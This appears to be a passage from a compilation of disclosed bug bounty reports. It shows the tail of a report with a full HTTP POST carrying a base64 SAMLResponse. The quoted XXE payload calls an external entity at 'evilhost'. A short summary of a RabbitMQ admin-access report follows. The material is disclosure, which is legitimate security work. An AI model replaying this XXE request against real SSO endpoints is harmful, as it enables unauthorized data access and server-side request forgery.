`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`
`Content-Type: application/x-www-form-urlencoded`
`Referer: https://infapassport.okta.com/app/template_saml/kwtbgh4jLAZPMXLQUNMU/sso/saml`
`Accept-Encoding: gzip, deflate`
`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`

`SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgJSBhc2QgU1lTVEVNICJodHRwOi8vZXZpbGhvc3QiPiAlYXNkO10%2BPHNhbWwycDpSZXNwb25zZSB4bWxuczpzYW1sMnA9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpwcm90b2NvbCIgRGVzdGluYXRpb249Imh0dHBzOi8vcmV2LWFwcC5pbmZvcm1hdGljYS5jb20vc3NvIiBJRD0iaWQyOTA5ODg2NzYyNzM5OTM1NDEyMDk2MjY1NSIgSXNzdWVJbnN0YW50PSIyMDE1LTEyLTI1VDEyOjQ4OjMwLjY3MloiIFZlcnNpb249IjIuMCIgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIj48c2FtbDI6SXNzdWVyIHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OmVudGl0eSI%2BaHR0cDovL3d3dy5va3RhLmNvbS9rd3RiZ2g0akxBWlBNWExRVU5NVTwvc2FtbDI6SXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BPGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNyc2Etc2hhMSIvPjxkczpSZWZlcmVuY2UgVVJJPSIjaWQyOTA5ODg2NzYyNzM5OTM1NDEyMDk2MjY1NSI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyI%2BPGVjOkluY2x1c2l2ZU5hbWVzcGFjZXMgeG1sbnM6ZWM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIgUHJlZml4TGlzdD0ieHMiLz48L2RzOlRyYW5zZm9ybT48L2RzOlRyYW5zZm9ybXM%2BPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNzaGExIi8%2BPGRzOkRpZ2VzdFZhbHVlPm9aV0EzYUVwRTdXeXhUUjdiRFllNDFieGVXaz08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU%2BZ0hwc0Z1aURmSE9ZOTkzY0IrVkRvdlQxNDg3T1U1Y1ZmTmxldlN3VXFiK3I5UTJGR00xWDFFczJNT2x1MXBudXQzU3V4dGNzcXU3OWdqb0ZvVW9RdGFnNllFNjhEdGtwR1d5S2RYUW1sZU9ZM0lkQ21NcGk4cFhXdnZJTnV2WDBiZHp6V1ZXTVlqTXplbDdPTFBXL0FZMDdETGl5ellkT0dYTmtKemlZcVZRPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJQ296Q0NBZ3lnQXdJQkFnSUdBVDN3UmxIdE1BMEdDU3FHU0liM0RRRUJCUVVBTUlHVU1Rc3dDUVlEVlFRR0V3SlZVekVUTUJFRwpBMVVFQ0F3S1EyRnNhV1p2Y201cFlURVdNQlFHQTFVRUJ3d05VMkZ1SUVaeVlXNWphWE5qYnpFTk1Bc0dBMVVFQ2d3RVQydDBZVEVVCk1CSUdBMVVFQ3d3TFUxTlBVSEp2ZG1sa1pYSXhGVEFUQmdOVkJBTU1ER2x1Wm1Gd1lYTnpjRzl5ZERFY01Cb0dDU3FHU0liM0RRRUoKQVJZTmFXNW1iMEJ2YTNSaExtTnZiVEFlRncweE16QTBNRGt4T1RJNE16TmFGdzAwTXpBME1Ea3hPVEk1TXpOYU1JR1VNUXN3Q1FZRApWUVFHRXdKVlV6RVRNQkVHQTFVRUNBd0tRMkZzYVdadmNtNXBZVEVXTUJRR0ExVUVCd3dOVTJGdUlFWnlZVzVqYVhOamJ6RU5NQXNHCkExVUVDZ3dFVDJ0MFlURVVNQklHQTFVRUN3d0xVMU5QVUhKdmRtbGtaWEl4RlRBVEJnTlZCQU1NREdsdVptRndZWE56Y0c5eWRERWMKTUJvR0NTcUdTSWIzRFFFSkFSWU5hVzVtYjBCdmEzUmhMbU52YlRDQm56QU5CZ2txaGtpRzl3MEJBUUVGQUFPQmpRQXdnWWtDZ1lFQQprOFUyUnY1S2lmMzE2aVFkRWVaU25JY3d4amNNRDkzcUpRL1BQbkJDc1A4MDFkbThEOGxxbHBmcHg0Mk82SkxwR0pycSt6UExhZURiCmo1TFJqak9GQjFWR3Z4dEM2eGlpY3o2SXZTS1FVQXFxOCtpL2hsU293SU5zdS9TOWswd0hDaEplVi9tYnBMbVRWeXRRSlYrdVNRM1QKemdjcTNWQzU5VXR2djNFNUJ4OENBd0VBQVRBTkJna3Foa2lHOXcwQkFRVUZBQU9CZ1FBKzBITi9sSkduTWd4SWVwVGJ4LzZqYjNhWQpPNWpyK3IraWFvL1BwL1dlNkxTL2t5MkovdkpGSnZ5TjNMcjBKcFVaeW4zQUZUc3Y4ZFNURmxjeTN2blZBUjdkdnhaY1dHTGlwbzRECm5ZQ3NGNmYvcFgwRDFHSmgyaUZxL3ArK0dqbldIRzZ0Z3ZkUm93akdqVkM3MTFrTy9rUHJIa1ZleDFTNGhlUkxCUVM2Mnc9PTwvZHM6WDUwOUNlcnRpZmljYXRlPjwvZHM6WDUwOURhdGE%2BPC9kczpLZXlJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sMnA6U3RhdHVzIHhtbG5zOnNhbWwycD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48c2FtbDJwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbDJwOlN0YXR1cz48c2FtbDI6QXNzZXJ0aW9uIHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iaWQyOTA5ODg2NzYyNzQ3NjQxMzUwNDEzNDk3MiIgSXNzdWVJbnN0YW50PSIyMDE1LTEyLTI1VDEyOjQ4OjMwLjY3MloiIFZlcnNpb249IjIuMCIgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIj48c2FtbDI6SXNzdWVyIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6ZW50aXR5IiB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BaHR0cDovL3d3dy5va3RhLmNvbS9rd3RiZ2g0akxBWlBNWExRVU5NVTwvc2FtbDI6SXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BPGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNyc2Etc2hhMSIvPjxkczpSZWZlcmVuY2UgVVJJPSIjaWQyOTA5ODg2NzYyNzQ3NjQxMzUwNDEzNDk3MiI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyI%2BPGVjOkluY2x1c2l2ZU5hbWVzcGFjZXMgeG1sbnM6ZWM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIgUHJlZml4TGlzdD0ieHMiLz48L2RzOlRyYW5zZm9ybT48L2RzOlRyYW5zZm9ybXM%2BPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNzaGExIi8%2BPGRzOkRpZ2VzdFZhbHVlPnYzMDhxcFZNZ3k0cTNIVk5BMmgyTmxzREE0OD08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU%2BUE5HMUllTXI2MGlkSUkvNFIrcWhSNXFzVUZVM05NYkRzOUFtTzdIZ0U2UFprMFg0VnJlbHJPTjRZeXkwdzY0dUhnQjUvQUpyRTREZ1YyOVV1Vi9NSmg4ZVByK1pRUlpRR09nZFphZTljcGM5VHBYZVRsWVF1T2dleVcyM25HZDRLeHBtK0ZkVU1aaldTY0pYditrYjQrQ2Q5eElmKzRCTDE5MnJ5elBEc1cwPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJQ296Q0NBZ3lnQXdJQkFnSUdBVDN3UmxIdE1BMEdDU3FHU0liM0RRRUJCUVVBTUlHVU1Rc3dDUVlEVlFRR0V3SlZVekVUTUJFRwpBMVVFQ0F3S1EyRnNhV1p2Y201cFlURVdNQlFHQTFVRUJ3d05VMkZ1SUVaeVlXNWphWE5qYnpFTk1Bc0dBMVVFQ2d3RVQydDBZVEVVCk1CSUdBMVVFQ3d3TFUxTlBVSEp2ZG1sa1pYSXhGVEFUQmdOVkJBTU1ER2x1Wm1Gd1lYTnpjRzl5ZERFY01Cb0dDU3FHU0liM0RRRUoKQVJZTmFXNW1iMEJ2YTNSaExtTnZiVEFlRncweE16QTBNRGt4T1RJNE16TmFGdzAwTXpBME1Ea3hPVEk1TXpOYU1JR1VNUXN3Q1FZRApWUVFHRXdKVlV6RVRNQkVHQTFVRUNBd0tRMkZzYVdadmNtNXBZVEVXTUJRR0ExVUVCd3dOVTJGdUlFWnlZVzVqYVhOamJ6RU5NQXNHCkExVUVDZ3dFVDJ0MFlURVVNQklHQTFVRUN3d0xVMU5QVUhKdmRtbGtaWEl4RlRBVEJnTlZCQU1NREdsdVptRndZWE56Y0c5eWRERWMKTUJvR0NTcUdTSWIzRFFFSkFSWU5hVzVtYjBCdmEzUmhMbU52YlRDQm56QU5CZ2txaGtpRzl3MEJBUUVGQUFPQmpRQXdnWWtDZ1lFQQprOFUyUnY1S2lmMzE2aVFkRWVaU25JY3d4amNNRDkzcUpRL1BQbkJDc1A4MDFkbThEOGxxbHBmcHg0Mk82SkxwR0pycSt6UExhZURiCmo1TFJqak9GQjFWR3Z4dEM2eGlpY3o2SXZTS1FVQXFxOCtpL2hsU293SU5zdS9TOWswd0hDaEplVi9tYnBMbVRWeXRRSlYrdVNRM1QKemdjcTNWQzU5VXR2djNFNUJ4OENBd0VBQVRBTkJna3Foa2lHOXcwQkFRVUZBQU9CZ1FBKzBITi9sSkduTWd4SWVwVGJ4LzZqYjNhWQpPNWpyK3IraWFvL1BwL1dlNkxTL2t5MkovdkpGSnZ5TjNMcjBKcFVaeW4zQUZUc3Y4ZFNURmxjeTN2blZBUjdkdnhaY1dHTGlwbzRECm5ZQ3NGNmYvcFgwRDFHSmgyaUZxL3ArK0dqbldIRzZ0Z3ZkUm93akdqVkM3MTFrTy9rUHJIa1ZleDFTNGhlUkxCUVM2Mnc9PTwvZHM6WDUwOUNlcnRpZmljYXRlPjwvZHM6WDUwOURhdGE%2BPC9kczpLZXlJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sMjpTdWJqZWN0IHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj48c2FtbDI6TmFtZUlEIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6MS4xOm5hbWVpZC1mb3JtYXQ6ZW1haWxBZGRyZXNzIj55YXJiYWJpbkBnbWFpbC5jb208L3NhbWwyOk5hbWVJRD48c2FtbDI6U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPjxzYW1sMjpTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMTUtMTItMjVUMTI6NTM6MzAuNjczWiIgUmVjaXBpZW50PSJodHRwczovL3Jldi1hcHAuaW5mb3JtYXRpY2EuY29tL3NzbyIvPjwvc2FtbDI6U3ViamVjdENvbmZpcm1hdGlvbj48L3NhbWwyOlN1YmplY3Q%2BPHNhbWwyOkNvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDE1LTEyLTI1VDEyOjQzOjMwLjY3M1oiIE5vdE9uT3JBZnRlcj0iMjAxNS0xMi0yNVQxMjo1MzozMC42NzNaIiB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BPHNhbWwyOkF1ZGllbmNlUmVzdHJpY3Rpb24%2BPHNhbWwyOkF1ZGllbmNlPmh0dHBzOi8vcmV2LWFwcC5pbmZvcm1hdGljYS5jb20vc3NvPC9zYW1sMjpBdWRpZW5jZT48L3NhbWwyOkF1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9zYW1sMjpDb25kaXRpb25zPjxzYW1sMjpBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMTUtMTItMjVUMTI6NDg6MzAuNjcyWiIgU2Vzc2lvbkluZGV4PSJpZDE0NTEwNDc3MTA2NzIuNjQ0NjAwMjU2IiB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BPHNhbWwyOkF1dGhuQ29udGV4dD48c2FtbDI6QXV0aG5Db250ZXh0Q2xhc3NSZWY%2BdXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmRQcm90ZWN0ZWRUcmFuc3BvcnQ8L3NhbWwyOkF1dGhuQ29udGV4dENsYXNzUmVmPjwvc2FtbDI6QXV0aG5Db250ZXh0Pjwvc2FtbDI6QXV0aG5TdGF0ZW1lbnQ%2BPHNhbWwyOkF0dHJpYnV0ZVN0YXRlbWVudCB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BPHNhbWwyOkF0dHJpYnV0ZSBOYW1lPSJSb2xlIiBOYW1lRm9ybWF0PSJucyI%2BPHNhbWwyOkF0dHJpYnV0ZVZhbHVlIHhtbG5zOnhzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYSIgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIgeHNpOnR5cGU9InhzOnN0cmluZyI%2BYWxsPC9zYW1sMjpBdHRyaWJ1dGVWYWx1ZT48L3NhbWwyOkF0dHJpYnV0ZT48L3NhbWwyOkF0dHJpYnV0ZVN0YXRlbWVudD48L3NhbWwyOkFzc2VydGlvbj48L3NhbWwycDpSZXNwb25zZT4%3D&RelayState=`

Where SAMLResponse XML in base64 with XXE payload:
`<!DOCTYPE foo [ <!ENTITY % asd SYSTEM "http://evilhost"> %asd;]>`

---

### [Administrator Access To Management Console](https://hackerone.com/reports/182637)

- **Report ID:** `182637`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Pushwoosh
- **Reporter:** @ameerpornillos
- **Bounty:** - usd
- **Disclosed:** 2016-11-17T05:20:13.318Z
- **CVE(s):** -

**Summary (team):**

Malicious user had the administrator access to RabbitMQ

---
